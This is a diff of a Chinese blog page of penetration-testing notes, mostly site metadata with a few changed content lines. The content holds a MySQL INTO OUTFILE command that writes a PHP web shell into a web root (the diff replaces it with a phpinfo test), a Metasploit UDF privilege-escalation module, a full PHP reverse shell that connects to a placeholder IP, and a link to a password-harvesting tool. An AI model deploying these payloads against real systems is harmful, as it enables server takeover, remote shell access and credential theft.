@@ -87,7 +87,7 @@
 <meta property="og:site_name" content="Mugen">
 <meta property="og:description" content="jfrog artifactory什么是Artifactory?一句话，开源的Maven仓库管理者 默认账号密码 admin password mysql1234首先进入information_schema 数据库use information_schema;select concat(round(sum(DATA_LENGTH/1024/1024),2),&amp;apos;MB&amp;apos;) as d">
 <meta property="og:locale" content="zh-Hans">
-<meta property="og:updated_time" content="2019-03-30T03:28:05.655Z">
+<meta property="og:updated_time" content="2019-07-26T04:43:58.937Z">
 <meta name="twitter:card" content="summary">
 <meta name="twitter:title" content="渗透知识小结">
 <meta name="twitter:description" content="jfrog artifactory什么是Artifactory?一句话，开源的Maven仓库管理者 默认账号密码 admin password mysql1234首先进入information_schema 数据库use information_schema;select concat(round(sum(DATA_LENGTH/1024/1024),2),&amp;apos;MB&amp;apos;) as d">
@@ -378,13 +378,14 @@
 <li>crontabs 定时任务反弹shell</li>
 <li></li>
 </ul>
-<h3 id="mysql拿shell"><a href="#mysql拿shell" class="headerlink" title="mysql拿shell"></a>mysql拿shell</h3><h4 id="xampp和phpstudy这些集成的环境可以根据默认路径来拿"><a href="#xampp和phpstudy这些集成的环境可以根据默认路径来拿" class="headerlink" title="xampp和phpstudy这些集成的环境可以根据默认路径来拿"></a>xampp和phpstudy这些集成的环境可以根据默认路径来拿</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">select @@basedir</span><br><span class="line">select &quot; &lt;?php @system($_POST[&quot;lego&quot;])?&gt; &quot; into outfile &quot;C:/xampp/htdocs/4.php&quot;</span><br><span class="line">select  LOAD_FILE(&quot;C:/xampp/htdocs/2.php&quot;)</span><br></pre></td></tr></table></figure>
+<h3 id="mysql拿shell"><a href="#mysql拿shell" class="headerlink" title="mysql拿shell"></a>mysql拿shell</h3><h4 id="xampp和phpstudy这些集成的环境可以根据默认路径来拿"><a href="#xampp和phpstudy这些集成的环境可以根据默认路径来拿" class="headerlink" title="xampp和phpstudy这些集成的环境可以根据默认路径来拿"></a>xampp和phpstudy这些集成的环境可以根据默认路径来拿</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">select @@basedir</span><br><span class="line">select &quot; &lt;?php phpinfo(); ?&gt; &quot; into outfile &quot;/oa/pro/apache/htdocs/rcetest.php&quot;</span><br><span class="line">select  LOAD_FILE(&quot;C:/xampp/htdocs/2.php&quot;)</span><br></pre></td></tr></table></figure>
 <h4 id="查看mysql导出权限"><a href="#查看mysql导出权限" class="headerlink" title="查看mysql导出权限"></a>查看mysql导出权限</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">show variables like &apos;%secure%&apos;;</span><br><span class="line">secure_file_priv 为 NULL 时，表示限制mysqld不允许导入或导出。</span><br><span class="line">secure_file_priv 为 /tmp 时，表示限制mysqld只能在/tmp目录中执行导入导出，其他目录不能执行。</span><br><span class="line">secure_file_priv 没有值时，表示不限制mysqld在任意目录的导入导出。</span><br></pre></td></tr></table></figure>
 <h4 id="msf-udp提权"><a href="#msf-udp提权" class="headerlink" title="msf udp提权"></a>msf udp提权</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">use exploit/multi/mysql/mysql_udf_paylo</span><br></pre></td></tr></table></figure>
 <h3 id="ubuntu16安装metasploit"><a href="#ubuntu16安装metasploit" class="headerlink" title="ubuntu16安装metasploit"></a>ubuntu16安装metasploit</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">sudo wget https://raw.githubusercontent.com/rapid7/metasploit-omnibus/master/config/templates/metasploit-framework-wrappers/msfupdate.erb</span><br><span class="line">mv msfupdate.erb msfinstall</span><br><span class="line">sudo chmod 755 msfinstall</span><br><span class="line">./msfinstall</span><br><span class="line">msfconsole</span><br></pre></td></tr></table></figure>
 <h3 id="php交互式反弹shell"><a href="#php交互式反弹shell" class="headerlink" title="php交互式反弹shell"></a>php交互式反弹shell</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">$sock = fsockopen(&quot;xx.xx.xx.xx&quot;, 1234);</span><br><span class="line">$descriptorspec = array(</span><br><span class="line">        0 =&gt; $sock,</span><br><span class="line">        1 =&gt; $sock,</span><br><span class="line">        2 =&gt; $sock</span><br><span class="line">);</span><br><span class="line">$process = proc_open(&apos;/bin/sh&apos;, $descriptorspec, $pipes);</span><br><span class="line">proc_close($process);</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure>
 <p>内网转发</p>
 <figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">https://www.freebuf.com/articles/web/170970.html</span><br></pre></td></tr></table></figure>
+<h3 id="信息收集神器"><a href="#信息收集神器" class="headerlink" title="信息收集神器"></a>信息收集神器</h3><p>搜索账号密码 <a href="https://github.com/AlessandroZ/LaZagne" target="_blank" rel="noopener">https://github.com/AlessandroZ/LaZagne</a></p>
 
       
     </div>
@@ -533,7 +534,7 @@
               
                 <a href="/archives/">
               
-                  <span class="site-state-item-count">36</span>
+                  <span class="site-state-item-count">39</span>
                   <span class="site-state-item-name">日志</span>
                 </a>
               </div>
@@ -544,7 +545,7 @@
               
               <div class="site-state-item site-state-categories">
                 <a href="/categories/index.html">
-                  <span class="site-state-item-count">7</span>
+                  <span class="site-state-item-count">8</span>
                   <span class="site-state-item-name">分类</span>
                 </a>
               </div>
@@ -555,7 +556,7 @@
               
               <div class="site-state-item site-state-tags">
                 <a href="/tags/index.html">
-                  <span class="site-state-item-count">59</span>
+                  <span class="site-state-item-count">61</span>
                   <span class="site-state-item-name">标签</span>
                 </a>
               </div>
@@ -588,7 +589,7 @@
             
 
             
-              <div class="post-toc-content"><ol class="nav"><li class="nav-item nav-level-3"><a class="nav-link" href="#jfrog-artifactory"><span class="nav-number">1.</span> <span class="nav-text">jfrog artifactory</span></a><ol class="nav-child"><li class="nav-item nav-level-4"><a class="nav-link" href="#什么是Artifactory"><span class="nav-number">1.1.</span> <span class="nav-text">什么是Artifactory?</span></a></li></ol></li><li class="nav-item nav-level-3"><a class="nav-link" href="#mysql"><span class="nav-number">2.</span> <span class="nav-text">mysql</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#redis"><span class="nav-number">3.</span> <span class="nav-text">redis</span></a><ol class="nav-child"><li class="nav-item nav-level-4"><a class="nav-link" href="#连接"><span class="nav-number">3.1.</span> <span class="nav-text">连接</span></a></li></ol></li><li class="nav-item nav-level-3"><a class="nav-link" href="#mysql拿shell"><span class="nav-number">4.</span> <span class="nav-text">mysql拿shell</span></a><ol class="nav-child"><li class="nav-item nav-level-4"><a class="nav-link" href="#xampp和phpstudy这些集成的环境可以根据默认路径来拿"><span class="nav-number">4.1.</span> <span class="nav-text">xampp和phpstudy这些集成的环境可以根据默认路径来拿</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#查看mysql导出权限"><span class="nav-number">4.2.</span> <span class="nav-text">查看mysql导出权限</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#msf-udp提权"><span class="nav-number">4.3.</span> <span class="nav-text">msf udp提权</span></a></li></ol></li><li class="nav-item nav-level-3"><a class="nav-link" href="#ubuntu16安装metasploit"><span class="nav-number">5.</span> <span class="nav-text">ubuntu16安装metasploit</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#php交互式反弹shell"><span class="nav-number">6.</span> <span class="nav-text">php交互式反弹shell</span></a></li></ol></div>
+              <div class="post-toc-content"><ol class="nav"><li class="nav-item nav-level-3"><a class="nav-link" href="#jfrog-artifactory"><span class="nav-number">1.</span> <span class="nav-text">jfrog artifactory</span></a><ol class="nav-child"><li class="nav-item nav-level-4"><a class="nav-link" href="#什么是Artifactory"><span class="nav-number">1.1.</span> <span class="nav-text">什么是Artifactory?</span></a></li></ol></li><li class="nav-item nav-level-3"><a class="nav-link" href="#mysql"><span class="nav-number">2.</span> <span class="nav-text">mysql</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#redis"><span class="nav-number">3.</span> <span class="nav-text">redis</span></a><ol class="nav-child"><li class="nav-item nav-level-4"><a class="nav-link" href="#连接"><span class="nav-number">3.1.</span> <span class="nav-text">连接</span></a></li></ol></li><li class="nav-item nav-level-3"><a class="nav-link" href="#mysql拿shell"><span class="nav-number">4.</span> <span class="nav-text">mysql拿shell</span></a><ol class="nav-child"><li class="nav-item nav-level-4"><a class="nav-link" href="#xampp和phpstudy这些集成的环境可以根据默认路径来拿"><span class="nav-number">4.1.</span> <span class="nav-text">xampp和phpstudy这些集成的环境可以根据默认路径来拿</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#查看mysql导出权限"><span class="nav-number">4.2.</span> <span class="nav-text">查看mysql导出权限</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#msf-udp提权"><span class="nav-number">4.3.</span> <span class="nav-text">msf udp提权</span></a></li></ol></li><li class="nav-item nav-level-3"><a class="nav-link" href="#ubuntu16安装metasploit"><span class="nav-number">5.</span> <span class="nav-text">ubuntu16安装metasploit</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#php交互式反弹shell"><span class="nav-number">6.</span> <span class="nav-text">php交互式反弹shell</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#信息收集神器"><span class="nav-number">7.</span> <span class="nav-text">信息收集神器</span></a></li></ol></div>
             
 
           </div>
